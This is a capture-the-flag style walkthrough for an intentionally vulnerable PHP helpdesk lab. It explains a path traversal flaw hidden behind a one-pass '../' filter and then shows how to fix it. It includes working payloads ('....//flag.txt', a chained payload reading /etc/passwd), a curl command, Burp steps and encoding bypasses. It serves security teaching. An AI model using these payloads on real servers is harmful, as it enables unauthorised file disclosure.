# Deskmint: Solution / Walkthrough

![CWE-22](https://img.shields.io/badge/CWE--22-Path%20Traversal-red?style=flat-square)
![PHP](https://img.shields.io/badge/PHP-Apache-777BB4?style=flat-square&logo=php&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**Deskmint is an intentionally vulnerable application built for security education.** It is a small helpdesk / ticketing app with a deliberate [path traversal](https://owasp.org/www-community/attacks/Path_Traversal)
(CWE-22) flaw — hidden behind a naive, non-recursive `../` filter — so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the payload and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* path traversal is and *how* to
approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a snippet of file-serving code and point to the exact vulnerable line.
- Explain why a single-pass blocklist filter is trivially bypassed.
- Explain **why** each fix works — and why some "obvious" fixes don't.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): path traversal
> happens when an app builds a file path from user input and trusts it to stay
> inside the intended folder. Deskmint strips `../` — but only once, so a nested
> payload reconstructs it.

If you only want the payload, jump to [Exploitation](#-exploitation) — but the
real value is in the *why*.

<br>

## 🐛 The vulnerability

The `src/Attachment.php` "sanitises" the requested filename like this:

```php
public static function resolve(string $attachmentsDir, string $requested): string
{
    // The vulnerable "sanitiser": strip "../" once (single, non-recursive pass).
    $safe = str_replace('../', '', $requested);

    return $attachmentsDir . \DIRECTORY_SEPARATOR . $safe;
}
```

Walk through it the way the computer does:

1. `$requested` comes **straight from the query string** — fully
   attacker-controlled.
2. `str_replace('../', '', $requested)` removes every `../` it finds — but in a
   **single pass**. It does not re-scan the string it just produced.
3. The "sanitised" value is concatenated onto `attachmentsDir` and opened. There
   is no check that the final path stays inside the directory.

The fatal detail is step 2. `str_replace` walks the input once, left to right,
removing matches as it goes — it never looks at the *result* for new matches it
may have created. So if a `../` appears *after* the removal, it survives:

```
"....//"   --remove the inner "../"-->   "../"
```

The middle `../` inside `....//` is the match that gets deleted; the leftover
characters (`..` + `/`) collapse into a brand-new, working `../`. The filter
congratulates itself while handing you a traversal.

> **Why does this look safe?** Because "we strip `../`" is a sentence that sounds
> like a fix. It even blocks the *obvious* payload. It just doesn't survive
> contact with an attacker who knows how one-pass replacement works.

<br>

## 💥 Exploitation

**The intended request** — what the app expects:

```
GET /attachment.php?file=vpn-client.log
```

Resolves to `attachments/vpn-client.log`. Working as designed.

**The naive payload is blocked** — the filter removes the `../`, so it stays
*inside* the directory (and you get a 404):

```
GET /attachment.php?file=../flag.txt        -> filter wins (404)
```

**The exploit** — double it up so a `../` survives the single pass:

```
GET /attachment.php?file=....//flag.txt
```

With `curl`:

```bash
curl --path-as-is "http://localhost:8099/attachment.php?file=....//flag.txt"
```

> **Why `--path-as-is`?** It stops curl from normalising the path *before* the
> request leaves your machine, so the server receives your payload byte-for-byte
> and the server-side filter is what you're actually testing.

Expected output:

```
FLAG{DESKMINT_ROOT_TICKET}
```

> **Where does the flag come from?** It is **not** in the repo — it is baked into
> the Docker image at build time at `/app/flag.txt`, one level above
> `attachments/` (see the `Dockerfile`). You have to exploit the traversal
> against the running container to read it.

<br>

## 🚀 Going further

Chain the payload to climb further and read files elsewhere on the container
filesystem:

```
GET /attachment.php?file=....//....//....//....//etc/passwd
```

Each `....//` survives one strip and becomes one `../`, so stacking them walks
up several levels.

> Inside the hardened container this reads the *container's* `/etc/passwd`, not
> your host's, and the app runs as a non-root user — the blast radius is
> deliberately small. That containment is why we run labs in Docker.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:8099>.
2. Open a ticket and capture the **Download** request in **Proxy > HTTP
   history**. Notice the filename lands in `?file=`.
3. Send it to **Repeater** and re-send the original value for a **baseline**.
4. Try `file=../flag.txt` — note it is blocked (404). This confirms a filter is
   present.
5. Change it to `file=....//flag.txt` and send. The filter is bypassed and the
   flag comes back.

> This is a great case for **Intruder**: load a traversal wordlist from
> [SecLists](https://github.com/danielmiessler/SecLists) and watch which
> encodings/nesting variants slip past the one-pass strip.

<br>

## 🛡️ The fix

Stripping substrings is the wrong approach — it is a blocklist, and blocklists
for path traversal are notoriously bypassable. **Resolve** the real path and
**verify** it stays inside the base directory:

```php
$base = realpath($attachmentsDir);
$full = realpath($attachmentsDir . '/' . $requested);

if ($full === false || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    return;
}
// safe to read $full
```

Why this works: `realpath()` collapses every `..` *and* resolves symlinks, so
you check the path the OS will actually open — not the string the user typed.
Both sides are canonicalised, so the `str_starts_with` comparison is apples to
apples, and anything outside the base is denied.

### ⚠️ Tempting fixes that *don't* work

These are the traps specific to a filter-based design:

- **Looping the strip until no `../` remains.** Better than one pass, but still a
  blocklist — it won't catch `..\` on Windows, URL-encoded `%2e%2e%2f`, or
  overlong/Unicode encodings. You'll bypass an *encoding-aware* filter that runs
  at the wrong time in **[ziphaven (Level 5)](https://github.com/iv0ks/ziphaven)**.
- **Blocking the literal string `..`.** Attackers bypass it with encoding
  (`%2e%2e`), double-encoding (`%252e`), or OS-specific separators. Blacklisting
  strings is a losing game.
- **Checking the raw string before resolving it.** Symlinks and encodings mean
  the string you inspected isn't the file you open. Always resolve *first*, then
  check.

> Series thread: **[snaptrail (Level 2)](https://github.com/iv0ks/snaptrail)**
> trusted a prefix; Deskmint tries to *filter* `..` and fails on one pass. Next,
> **[medialoft (Level 4)](https://github.com/iv0ks/medialoft)** validates the
> wrong property entirely — the file *extension*.

### ✅ Even better: don't build paths from user input at all

- **Opaque IDs.** Serve attachments by a server-side ID mapped to a real path.
  The user never names a file, so there's nothing to traverse.
- **Allow-list.** Accept only the attachment names a ticket actually references.
- **Use a vetted helper.** Reach for a framework's safe file-serving helper
  instead of hand-rolling path logic.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **Blocklists lose.** Stripping or rejecting "bad" substrings is a cat-and-mouse
   game you don't win.
2. **One-pass replacement is self-defeating.** Removing a pattern can *create*
   the same pattern — `....//` → `../`.
3. **Resolve, then check.** Canonicalise with `realpath()` *before* validating,
   and fail closed if the result escapes the base directory.
4. **Encodings are coming.** A string filter that ignores `%2e%2e%2f` or `..\`
   is still broken — you'll prove it in later levels.
5. **Defence in depth matters.** Non-root + container didn't *fix* the bug, but
   it kept the blast radius small.

That's Level 3 — a filter that looks defensive and isn't. Head back to the
**[Learning Guide](GUIDE.md)** for the method, or the **[README](README.md)** for
the lab setup.
